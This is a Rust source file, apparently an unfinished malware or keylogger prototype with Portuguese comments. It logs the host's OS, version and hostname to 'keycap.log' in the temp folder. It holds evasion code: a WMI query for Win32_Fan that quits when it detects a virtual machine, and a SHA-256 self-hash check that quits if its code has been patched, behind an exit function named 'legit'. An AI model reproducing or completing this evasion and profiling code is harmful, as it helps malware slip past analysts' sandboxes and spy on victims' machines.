use std::fs::OpenOptions;
//use std::thread;
//use std::time::Duration;
//use chrono::{format, prelude::*};
use std::io::Write;
use std::fs::File;
use std::collections::HashMap;
use wmi::{COMLibrary, WMIConnection, WMIResult, Variant};
use sha2::{Sha256, Digest};

// precisa mudar dps para o hash da func depois de pronta
const EXPECTED: [u8;32] = [0x34,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56];

// macro de erro
macro_rules! error {
    ($msg:expr, $($arg:expr), *) => {
        println!("[!] {}", format!($msg,$($arg),*))
    };
}

fn legit(){std::process::exit(1)}

fn info_basica(file: &mut File){
    // aq estou pegando as informações do sistema, como verssao, o tipo de sistema e entre outros.
    let info_so = {
        let info = os_info::get();
        format!("OS: {}\nVerssão: {}\n", info.os_type(), info.version())
    };
    log(file, info_so);
    let hostname_wrap = hostname::get();
    if hostname_wrap.is_ok(){
        log(file, format!("Hostname: {:?}\n",hostname_wrap.unwrap()))
    }
    
    else {log(file, format!("Hostname: Erro"));}

}

fn log(file: &mut File, s:String){
    match file.write(s.as_bytes()){
        Err(err) => error!("Não foi possivel escrever no arquivo erro= {}", err),
        _ => {},
    }

    match file.flush(){
        Err(err) => {error!("Erro a dar flush para escrever no arquivo erro= {}",err)},
        _=> {}
    }
}

// fn() é um function pointer (ponteiro de função)
// isso não executa a função.
// isso recebe o endereço dela.
fn get_fn_addr(f: fn()) -> usize {
    f as usize
}

fn hash_protected_region() -> Vec<u8> {
    let start = get_fn_addr(integrity_start as fn());
    let end   = get_fn_addr(integrity_end as fn());

    let size = end - start;

    let bytes = unsafe {
        std::slice::from_raw_parts(start as *const u8, size)
    };

    let mut hasher = Sha256::new();
    hasher.update(bytes);
    hasher.finalize().to_vec()
}

#[inline(never)]
#[unsafe(no_mangle)] // garante que o símbolo exista no binário.
pub fn integrity_start() {}

#[inline(never)]
fn check_vm() -> WMIResult<()>{
    
    let com_lib = COMLibrary::new()?;
    let wmi_con = WMIConnection::new(com_lib)?;

    let results: Vec<HashMap<String, Variant>> = wmi_con.raw_query("SELECT * FROM Win32_Fan")?;

     if results.is_empty(){
        legit();
    }

    Ok(())
}

#[inline(never)]
#[unsafe(no_mangle)] // garante que o símbolo exista no binário.
pub fn integrity_end() {}


fn verify_function_integrity() {
    let current = hash_protected_region();

    if current != EXPECTED {
        //println!("Function patched!");
        legit();
    }
}

fn main() {

    // temporario para pegar o hash oficial das func :)
    //let h = hash_protected_region();
    //println!("{:x?}", h);

    
    let temp_path = std::env::temp_dir();
    let filename = temp_path.join("keycap.log");

    let mut output = OpenOptions::new()
        .write(true)
        .create(true)
        .open(filename)
        .expect("erro ao criar arquivo");

    info_basica(&mut output);
    
}